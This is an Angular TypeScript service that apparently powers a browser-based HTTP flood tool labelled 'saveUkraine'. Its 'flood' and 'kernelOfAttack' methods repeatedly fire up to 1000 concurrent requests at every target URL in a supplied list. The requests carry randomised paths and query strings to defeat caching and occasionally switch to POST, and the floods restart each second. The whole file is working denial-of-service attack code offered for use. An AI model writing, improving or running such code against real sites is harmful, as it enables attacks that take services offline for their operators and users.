import {Injectable} from '@angular/core';
import {Reactive} from '@app/common/cdk/reactive';
import {RequestMethodEnum} from '@app/common/enums/request-method.enum';
import {UrlModel} from '@app/common/model/url/url.model';
import {setTimeout$} from '@app/common/tools/tool';
import {MainServiceApp} from '@app/common/services/app/main/main.service.app';

@Injectable({
  providedIn: 'root' // TODO module
})
export class StartServiceApp extends Reactive {

  private _concurrencyLimit: number = 1000;
  private _queue: Promise<void>[] = [];
  private _keywords: string[] = [
    'id/',
    'id',
    'news/',
    'news',
    'admin/',
    'api/',
    ''
  ];

  private _saveUkraineIsStarted: boolean = false;

  constructor(
    private readonly mainServiceApp: MainServiceApp
  ) {
    super();

    this.mainServiceApp.urlList$?.pipe(this.takeUntil()).subscribe(() => {

      if (this._saveUkraineIsStarted) {

        this.stopSaveUkraine();

        setTimeout$(() => {

          this.startSaveUkraine();

        }, 1000);

      }

    });

  }

  public get concurrencyLimit(): number {
    return this._concurrencyLimit;
  }

  /**
   *
   * @param value
   */
  public setConcurrencyLimit(value: number): void {
    this._concurrencyLimit = value;
  }

  /**
   *
   * @param resource
   * @param options
   */
  public async fetchWithTimeout(resource, options): Promise<any> {

    const controller = new AbortController(); // TODO check
    const id = setTimeout(() => controller.abort(), options.timeout);
    const rnd = Math.floor(Math.random() * 100);
    // try to use post methods, just in case
    const method: RequestMethodEnum = rnd < 10 ? RequestMethodEnum.POST : RequestMethodEnum.GET;

    return fetch(resource, {
      method,
      mode: 'no-cors',
      signal: controller.signal
    }).then((response) => {
      clearTimeout(id);
      return response;
    }).catch((error) => {
      clearTimeout(id);
      throw error;
    });

  }

  public async flood(target: UrlModel): Promise<void> {

    for (let i = 0; this._saveUkraineIsStarted; ++i) {

      if (this._queue.length > this._concurrencyLimit) {
        await this._queue.shift();
      }

      const rand: string = i % 3 === 0 ? '' : ('?' + Math.random() * 1000);
      const keyword: string = this._keywords[Math.floor(Math.random() * this._keywords.length)];

      this._queue.push(
        this.fetchWithTimeout(target.url + keyword + rand, {timeout: 1000})
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
            target.incrementNumberOfErroredResponses();
          })
          .then((response) => {
            if (response && !response.ok) {
              target.incrementNumberOfErroredResponses();
            }
            target.incrementNumberOfRequests();
          })
      );

    }

  }

  public get saveUkraineIsStarted(): boolean {
    return this._saveUkraineIsStarted;
  }

  public startSaveUkraine(): void {

    this._saveUkraineIsStarted = true;

    this.kernelOfAttack();

  }

  public stopSaveUkraine(): void {

    this._saveUkraineIsStarted = false;

  }

  private kernelOfAttack(): void {

    if (this._saveUkraineIsStarted) {

      setTimeout$(() => {

        this.mainServiceApp.getUrlList()?.list?.forEach((urlModel) => {

          this.flood(urlModel as UrlModel);

        });

        this.kernelOfAttack();

      }, 1000);

    }

  }

}
